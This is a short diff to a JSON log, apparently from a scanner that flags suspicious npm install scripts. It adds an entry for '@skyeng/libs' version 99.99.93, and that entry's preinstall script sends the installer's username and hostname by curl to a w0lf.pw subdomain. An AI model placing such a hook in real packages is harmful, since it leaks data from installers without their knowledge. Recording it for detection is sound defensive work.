@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "@skyeng/libs",
+    "version": "99.99.93",
+    "scriptType": "preinstall",
+    "scriptContent": "u=$(whoami); h=$(hostname); curl http://trmskyeng-$u-$h.w0lf.pw",
+    "previousVersion": "99.99.92",
+    "timestamp": "2026-02-08T13:07:29.230Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "jav-manager",
     "version": "0.1.2",
     "scriptType": "postinstall",
